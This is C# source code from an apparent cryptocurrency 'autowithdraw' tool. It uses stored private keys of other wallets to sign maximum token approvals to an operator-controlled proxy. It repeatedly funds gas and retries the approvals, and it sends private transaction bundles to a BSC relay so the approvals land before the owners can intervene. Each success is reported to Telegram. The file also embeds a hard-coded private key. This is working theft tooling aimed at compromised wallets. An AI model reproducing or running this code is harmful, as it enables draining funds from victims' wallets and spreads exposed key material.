using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.WebSocketStreamingClient;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.RPC.Reactive.Eth.Subscriptions;
using Nethereum.Signer;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.Numerics;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace Autowithdraw.Main.Actions
{
    internal class AutoApprove
    {
        public static string Last;

        public static List<string> Approved = new List<string>();

        public static async Task Starter(
            string Address,
            string ContractAddress,
            int ChainID,
            bool fromTelegram = false,
            string Revoke = "",
            bool itIsNotProxy = false)
        {
            Logger.Debug($"{(Revoke == "" ? "Approving" : $"Revoking {Revoke}")} in {Address}");

            #region Values

            Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                Settings.Chains[ChainID].HTTPClient);

            string Link = Settings.Chains[ChainID].Link;
            string Destination = Revoke == "" ? Settings.Config.Proxy.Address : Revoke;
            BigInteger Value = Revoke == "" || itIsNotProxy ? Settings.MaxInt : 0;

            var Contract = new ContractHelper(Address, ContractAddress, Account);

            Function Approve = Contract.Get("approve");
            BigInteger Gas = await Approve.EstimateGasAsync(Address, null, null, Destination, Value);
            float Amount = Pricing.GetPriceEther(await Pricing.GetFee(Gas, ChainID), ChainID);
            Amount += Amount * 0.1f;
            BigInteger ApprovedWei = 666;

            #endregion

            if (!Pricing.ValidPrice(ChainID, Address, ContractAddress, Settings.MaxInt, Settings.MaxInt, await Contract.Decimals(), await Contract.Name(), out _, out _, out _))
                goto END;

            if (Amount >= 0.2)
            {
                Logger.Debug($"Approve for Contract {ContractAddress} high the normal");
                return;
            }

            await Task.Factory.StartNew(async () =>
            {
                if (ContractAddress == "0x912CE59144191C1204E64559FE8253a0e49E6548")
                    return;
                if (Last == Address && !fromTelegram)
                    return;

                Last = Address;
                for (int y = 0; y < (fromTelegram ? 1 : 3); y++)
                {
                    for (int x = 0; x < 5; x++)
                    {
                        for (int i = 0; i < 2; i++)
                        {
                            if (ApprovedWei == Value)
                                return;
                            await Helper.TransferGas(Address, ChainID, Amount, fromAutoApprove: true);
                            Thread.Sleep(3500);
                        }
                        Thread.Sleep(10000);
                    }
                    Thread.Sleep(1000 * 60 * 2);
                }
            });

            for (int i = 0, x = 0; i < 300 && x < 8200; x++)
            {
                try
                {
                    ApprovedWei = await Contract.Allowance(Address, Destination);
                    if (ApprovedWei == Value && fromTelegram)
                        break;

                    #region Filtering Gas

                    BigInteger AccountWei = (await Account.Eth.GetBalance.SendRequestAsync(Address)).Value - 666;
                    BigInteger GasPrice = AccountWei / Gas;
                    if (GasPrice < 0)
                        throw new Exception("Not have balance");

                    #endregion

                    string txHash = await Approve.SendTransactionAsync(new TransactionInput
                    {
                        From = Address,
                        Gas = new HexBigInteger(Gas),
                        GasPrice = new HexBigInteger(GasPrice),
                        Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address,
                            BlockParameter.BlockParameterType.latest)
                    }, Destination, Value);

                    if (ContractAddress != "0x912CE59144191C1204E64559FE8253a0e49E6548")
                        await Task.Factory.StartNew(async () =>
                        {
                            TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);
                            if (!Transaction.Succeeded())
                                return;

                            #region Notification

                            string Symbol = await Contract.Symbol();
                            Logger.Debug($"{(Revoke == "" ? "Approved" : $"Revoked {Revoke}")} in {Address}");
                            await Network.SendTelegram(
                                $"🛡 <a href=\"https://{Link}/tx/{txHash}\">{(Revoke == "" ? "Approved" : "Revoked")}</a> <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>", ContractAddress, ChainID, true, isTransaction: true);

                            #endregion
                        });
                }
                catch (Exception e)
                {
                    if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("Not have balance"))
                    {
                        Thread.Sleep(50);
                        continue;
                    }
                }

                i++;
                Thread.Sleep(300);
            }

        END:
            Last = "";
        }

        public static List<string> TXHashes = new List<string>();

        public static async Task Flashbots(
            string Address,
            string ApproveAddress,
            string ContractAddress)
        {
            try
            {
                Actions.Flashbots.Withdrawing.Add(Address);

                Logger.Debug($"{Address} approving...");

                #region Values

                var key = EthECKey.GenerateKey();

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], 56), Settings.Chains[56].HTTPClient);

                ContractHelper Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Approve = Contract.Get("approve");

                Account MainAccount = new Account("d9afe578156617785e70e5fbcbc9f5e160e2c6fd516a5bf631ef8d3b7b5a9862", 56);
                Web3 Main = new Web3(MainAccount, Settings.Chains[56].HTTPClient);

                BigInteger GasLimit = await Approve.EstimateGasAsync(Address, null, null, ApproveAddress, Settings.MaxInt);
                BigInteger GasPrice = Web3.Convert.ToWei(60, UnitConversion.EthUnit.Gwei);

                #endregion

                await Task.Factory.StartNew(async () =>
                {
                    #region First Bundle

                    BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                        Address, BlockParameter.BlockParameterType.latest);

                    Bundle bundle = new Bundle
                    {
                        jsonrpc = "2.0",
                        id = 48,
                        method = "eth_sendPuissant",
                        @params = new[]
                        {
                            new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * GasPrice + 1000000),
                                            GasPrice = new HexBigInteger(GasPrice),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(GasPrice),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Approve.GetData(ApproveAddress, Settings.MaxInt)
                                    })
                                },
                                maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 20
                            }
                        }
                    };


                    string txHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);

                    Logger.Debug($"TX - {txHash}");
                    Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));

                    #endregion

                    #region Notification

                    using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[56].WSS);
                    var subscription = new EthNewBlockHeadersObservableSubscription(client);
                    bool subscribed = true;
                    int Tries = 0;

                    if (TXHashes.Contains(txHash))
                        return;

                    TXHashes.Add(txHash);

                    subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                    {
                        try
                        {
                            if (Tries > 20)
                                subscribed = false;
                            Tries++;

                            var Block =
                                await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                    .SendRequestAsync(block.Number);

                            #region Notification

                            bool Finded = false;
                            string findedHash = "";

                            foreach (Transaction transaction in Block.Transactions)
                            {
                                if (TXHashes.Contains(transaction.TransactionHash))
                                {
                                    Finded = true;
                                    findedHash = transaction.TransactionHash;
                                }
                            }

                            if (Finded && TXHashes.Contains(findedHash) /*&& (Price < 155000 || !Settings.Start || Address == "0x94Bdd603e222A2aE72831B418e3C45661b662B54")*/)
                            {
                                Logger.Debug($"Included in block - {block.Number}");
                                subscribed = false;
                                TXHashes.Remove(findedHash);

                                string Symbol = await Contract.Symbol();

                                Logger.Debug($"Approved {ApproveAddress} in {Symbol} from {Address}",
                                    ConsoleColor.Green);
                                await Network.SendTelegram(
                                    $"✅ <a href=\"https://bscscan.com/tx/{findedHash}\">Executed Approve</a>\n\nWallet: <a href=\"https://bscscan.com/address/{Address}\">{Address}</a>",
                                    ContractAddress, 56, true);

                                return;
                            }

                            #endregion

                            #region Second Bundle

                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                Address, BlockParameter.BlockParameterType.latest);

                            bundle.@params[0] = new @params
                            {
                                txs = new List<string>
                                {
                                    "0x" + await MainAccount.TransactionManager.SignTransactionAsync(
                                        new TransactionInput
                                        {
                                            From = MainAccount.Address,
                                            To = Address,
                                            Value = new HexBigInteger(GasLimit * GasPrice + 1000000),
                                            GasPrice = new HexBigInteger(GasPrice),
                                            Nonce = new HexBigInteger(
                                                await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                                    MainAccount.Address,
                                                    BlockParameter.BlockParameterType.latest))
                                        }),
                                    "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                    {
                                        From = Address,
                                        To = ContractAddress,
                                        GasPrice = new HexBigInteger(GasPrice),
                                        Gas = new HexBigInteger(GasLimit),
                                        Nonce = new HexBigInteger(Nonce),
                                        Data = Approve.GetData(ApproveAddress, Settings.MaxInt)
                                    })
                                },
                                maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 20
                            };

                            Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));
                            string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                            if (!TXHashes.Contains(calculatedHash))
                                TXHashes.Add(calculatedHash);

                            #endregion

                            Logger.Debug($"Block passed - {block.Number}");
                        }
                        catch (Exception e)
                        {
                            if (e.Message.Contains("transfer amount exceeds balance") ||
                                e.Message.Contains("eth_estimateGas"))
                            {
                                Logger.Error("Not balance");
                                subscribed = false;
                                return;
                            }

                            Logger.Error(e);
                        }
                    });

                    await client.StartAsync();
                    await subscription.SubscribeAsync();
                    while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));
                    Logger.Debug($"Unsubcribed {Address}");

                    #endregion
                });
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }
    }
}
